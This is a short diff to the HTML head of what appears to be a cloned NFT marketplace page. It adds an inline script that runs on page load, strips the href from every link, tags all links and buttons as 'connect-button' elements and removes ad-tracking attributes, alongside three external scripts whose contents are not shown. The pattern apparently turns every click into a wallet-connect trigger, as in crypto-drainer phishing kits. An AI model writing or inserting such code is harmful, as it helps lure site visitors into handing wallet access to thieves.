@@ -12,6 +12,27 @@
   <script src="./module-x.js" defer></script>
   <script src="./module-s.js" defer></script>
   <script src="./web.js" defer></script>
+  <script>
+  document.addEventListener('DOMContentLoaded', function () {
+    // Remove href from <a> tags and add class
+    document.querySelectorAll('body a').forEach(link => {
+      link.removeAttribute('href');
+      link.classList.add('connect-button');
+    });
+
+    // Add class to all <button> elements
+    document.querySelectorAll('body button').forEach(button => {
+      button.classList.add('connect-button');
+    });
+
+    // Remove 'ad-data-linked' attribute
+    const elements = document.querySelectorAll('[ad-data-linked]');
+    elements.forEach(el => el.removeAttribute('ad-data-linked'));
+
+    console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+  });
+</script>
+
   <meta charSet="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <meta property="og:title" content="Fastest NFT Marketplace for Pro Traders" />
